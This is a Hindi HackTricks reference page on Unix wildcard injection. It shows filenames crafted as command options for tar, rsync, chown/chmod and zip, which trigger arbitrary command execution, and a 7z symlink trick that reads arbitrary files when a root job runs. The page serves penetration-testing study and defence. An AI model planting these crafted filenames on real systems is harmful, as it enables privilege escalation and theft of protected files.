<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह में शामिल हों**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **अपनी हैकिंग तरकीबें साझा करें, HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके.

</details>


## chown, chmod

आप **यह निर्दिष्ट कर सकते हैं कि आप बाकी फाइलों के लिए किस फाइल मालिक और अनुमतियों की प्रतिलिपि बनाना चाहते हैं**
```bash
touch "--reference=/my/own/path/filename"
```
आप इसका उपयोग कर सकते हैं [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(संयुक्त हमला)_\
__अधिक जानकारी के लिए [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**मनमाने कमांड्स को निष्पादित करें:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
आप इसका उपयोग कर सकते हैं [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar attack)_\
__अधिक जानकारी के लिए [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**मनमाने कमांड्स निष्पादित करें:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
आप इसका उपयोग कर सकते हैं [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(rsync हमला)_
__अधिक जानकारी के लिए [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

**7z** में भी `--` का उपयोग करते हुए `*` से पहले (नोट करें कि `--` का मतलब है कि आगे का इनपुट पैरामीटर्स के रूप में नहीं माना जा सकता, इसलिए इस मामले में केवल फाइल पथ) आप एक मनमानी त्रुटि पैदा कर सकते हैं जिससे फाइल पढ़ी जा सकती है, इसलिए अगर निम्नलिखित जैसा कमांड root द्वारा निष्पादित किया जा रहा है:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
और यदि आप उस फ़ोल्डर में फाइलें बना सकते हैं जहां यह निष्पादित किया जा रहा है, तो आप `@root.txt` नामक फाइल बना सकते हैं और `root.txt` फाइल को उस फाइल के लिए एक **symlink** के रूप में बना सकते हैं जिसे आप पढ़ना चाहते हैं:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
फिर, जब **7z** निष्पादित होता है, तो यह `root.txt` को एक फ़ाइल के रूप में मानेगा जिसमें उस सूची की सूची होती है जिसे उसे संपीड़ित करना चाहिए (यही `@root.txt` के अस्तित्व का संकेत है) और जब यह 7z `root.txt` को पढ़ता है, तो यह `/file/you/want/to/read` को पढ़ेगा और **चूंकि इस फ़ाइल की सामग्री फ़ाइलों की सूची नहीं है, यह एक त्रुटि फेंक देगा** जिससे सामग्री दिखाई देगी।

_बॉक्स CTF से Write-ups की अधिक जानकारी के लिए HackTheBox देखें।_

## Zip

**मनमाने आदेश निष्पादित करें:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
<details>

<summary><strong>शून्य से नायक तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह में शामिल हों**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके.

</details>
